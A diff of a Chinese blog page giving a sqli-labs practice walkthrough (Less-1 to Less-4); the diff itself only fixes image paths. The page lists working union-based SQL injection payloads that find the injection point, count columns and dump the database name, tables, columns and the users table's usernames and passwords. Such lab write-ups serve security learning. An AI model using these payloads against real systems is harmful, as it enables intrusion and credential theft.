@@ -29,18 +29,18 @@
 <meta property="og:site_name" content="WJW&#39;s Blog">
 <meta property="og:description" content="开始sql靶场的学习，">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/.com//1.png">
-<meta property="og:image" content="http://example.com/.com//2.png">
-<meta property="og:image" content="http://example.com/.com//3.png">
-<meta property="og:image" content="http://example.com/.com//4.png">
-<meta property="og:image" content="http://example.com/.com//5.png">
-<meta property="og:image" content="http://example.com/.com//6.png">
+<meta property="og:image" content="http://example.com/2020/11/12/sqli-labs/1~4/1~4.md/1.png">
+<meta property="og:image" content="http://example.com/2020/11/12/sqli-labs/1~4/1~4.md/2.png">
+<meta property="og:image" content="http://example.com/2020/11/12/sqli-labs/1~4/1~4.md/3.png">
+<meta property="og:image" content="http://example.com/2020/11/12/sqli-labs/1~4/1~4.md/4.png">
+<meta property="og:image" content="http://example.com/2020/11/12/sqli-labs/1~4/1~4.md/5.png">
+<meta property="og:image" content="http://example.com/2020/11/12/sqli-labs/1~4/1~4.md/6.png">
 <meta property="article:published_time" content="2020-11-12T13:55:54.000Z">
 <meta property="article:modified_time" content="2021-07-27T01:56:47.586Z">
 <meta property="article:author" content="WJW">
 <meta property="article:tag" content="SQL注入">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/.com//1.png">
+<meta name="twitter:image" content="http://example.com/2020/11/12/sqli-labs/1~4/1~4.md/1.png">
 
 <link rel="canonical" href="http://example.com/2020/11/12/sqli-labs/1~4/">
 
@@ -269,13 +269,13 @@
 
 
 
-<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><h5 id="首先判断注入点的类型"><a href="#首先判断注入点的类型" class="headerlink" title="首先判断注入点的类型"></a>首先判断注入点的类型</h5><p>只有单引号出现报错，单引号为注入点。<br><code>?id=1&#39;</code><br><img src="/.com//1.png"></p>
+<h3 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h3><h4 id="Less-1"><a href="#Less-1" class="headerlink" title="Less-1"></a>Less-1</h4><h5 id="首先判断注入点的类型"><a href="#首先判断注入点的类型" class="headerlink" title="首先判断注入点的类型"></a>首先判断注入点的类型</h5><p>只有单引号出现报错，单引号为注入点。<br><code>?id=1&#39;</code><br><img src="1~4.md/1.png"></p>
 <h5 id="判断列数"><a href="#判断列数" class="headerlink" title="判断列数"></a>判断列数</h5><p><code>?id=1&#39;order by 4--+</code>(多次猜测可得出有3列)</p>
-<h4 id="将1改成不存在数据库的，得出2，3列有回显。"><a href="#将1改成不存在数据库的，得出2，3列有回显。" class="headerlink" title="将1改成不存在数据库的，得出2，3列有回显。"></a>将1改成不存在数据库的，得出2，3列有回显。</h4><p><code>?id=-1&#39; union select 1,2,3--+</code><br><img src="/.com//2.png"></p>
-<h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><p><code>?id=-1&#39; union select 1,2,database()--+</code> 得出security。<br><img src="/.com//3.png"></p>
-<h4 id="爆数据表"><a href="#爆数据表" class="headerlink" title="爆数据表"></a>爆数据表</h4><p><code>?id=-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="/.com//4.png"></p>
-<h4 id="爆user表的列"><a href="#爆user表的列" class="headerlink" title="爆user表的列"></a>爆user表的列</h4><p><code>?id=-1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;--+</code><br><img src="/.com//5.png"></p>
-<h4 id="爆用户名和密码"><a href="#爆用户名和密码" class="headerlink" title="爆用户名和密码"></a>爆用户名和密码</h4><p><code>?id=-1&#39; union select 1,2,group_concat(username,&#39;-&#39;,password) from users --+</code><br><img src="/.com//6.png"></p>
+<h4 id="将1改成不存在数据库的，得出2，3列有回显。"><a href="#将1改成不存在数据库的，得出2，3列有回显。" class="headerlink" title="将1改成不存在数据库的，得出2，3列有回显。"></a>将1改成不存在数据库的，得出2，3列有回显。</h4><p><code>?id=-1&#39; union select 1,2,3--+</code><br><img src="1~4.md/2.png"></p>
+<h4 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h4><p><code>?id=-1&#39; union select 1,2,database()--+</code> 得出security。<br><img src="1~4.md/3.png"></p>
+<h4 id="爆数据表"><a href="#爆数据表" class="headerlink" title="爆数据表"></a>爆数据表</h4><p><code>?id=-1&#39; union select 1,2,group_concat(table_name)from information_schema.tables where table_schema=&#39;security&#39;--+</code><br><img src="1~4.md/4.png"></p>
+<h4 id="爆user表的列"><a href="#爆user表的列" class="headerlink" title="爆user表的列"></a>爆user表的列</h4><p><code>?id=-1&#39; union select 1,2,group_concat(column_name)from information_schema.columns where table_name=&#39;users&#39;--+</code><br><img src="1~4.md/5.png"></p>
+<h4 id="爆用户名和密码"><a href="#爆用户名和密码" class="headerlink" title="爆用户名和密码"></a>爆用户名和密码</h4><p><code>?id=-1&#39; union select 1,2,group_concat(username,&#39;-&#39;,password) from users --+</code><br><img src="1~4.md/6.png"></p>
 <h3 id="Less-2"><a href="#Less-2" class="headerlink" title="Less-2"></a>Less-2</h3><p>判断类型：为数字注入型。将id=1改成id=-1即可，改成一个不存在数据库的即可。</p>
 <h3 id="Less-3"><a href="#Less-3" class="headerlink" title="Less-3"></a>Less-3</h3><h4 id="字符型注入。"><a href="#字符型注入。" class="headerlink" title="字符型注入。"></a>字符型注入。</h4><h5 id="判断类型：只有输入”回显正常，为注入点。"><a href="#判断类型：只有输入”回显正常，为注入点。" class="headerlink" title="判断类型：只有输入”回显正常，为注入点。"></a><strong>判断类型：只有输入”回显正常，为注入点。</strong></h5><p>说明此处为字符型注入，且是以(‘’)的方式闭合字符串的；这里的’   ‘ 不是”  “ 。</p>
 <h3 id="Less-4"><a href="#Less-4" class="headerlink" title="Less-4"></a>Less-4</h3><p>改成”)即可。</p>
